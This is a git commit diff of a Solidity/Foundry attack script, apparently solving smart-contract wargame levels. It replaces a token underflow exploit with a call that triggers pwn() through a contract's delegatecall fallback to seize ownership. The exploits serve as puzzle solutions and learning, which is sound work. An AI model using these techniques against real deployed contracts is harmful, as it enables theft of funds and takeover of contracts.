ed069e34341cceeeae9b6aa1530e1ba0f4b44ee2
dCRYPT <39372980+adeolu98@users.noreply.github.com>
2023-06-10 15:40:14 +0100

    finish

--- script/Attack.s.sol
+++ script/Attack.s.sol
@@ -2,25 +2,21 @@
 pragma solidity ^0.8.13;
 
 import "forge-std/Script.sol";
-import "../src/Token.sol";
+import "../src/Delegate.sol";
 import "forge-std/console.sol";
 
 contract AttackScript is Script {
     function setUp() public {}
 
 
-// solved, issue due to overflow in token contract (version 0.6.0) transfer function when subtracting big num from small num
-    function run() public {
+ //solveed by using the fallback and adding msg.data to the ether send call. 
+  function run() public {
         vm.startBroadcast();
 
-        Token token = Token(0xDEd123dc4795C597c06514F259E438BF91006F32);
-
-        token.transfer(address(0), 10000);
-
-        console.log(
-            "bal of ",
-            token.balanceOf(0x80805ae3cbE23715C1f1807A03C5fb669541C2A9)
-        );  
+        Delegate delegateContract = Delegate(0x3D46E42dE1a9E264c9bdCeED9963390650347899);
+        
+        (bool success, ) = address(delegateContract).call(abi.encodeWithSignature("pwn()"));
+        require(success, "Transfer failed.");
 
         vm.stopBroadcast();
     }
--- src/Attacker.sol
+++ src/Attacker.sol
@@ -1,8 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-import "./Token.sol";
-
 
 contract Attacker {
 
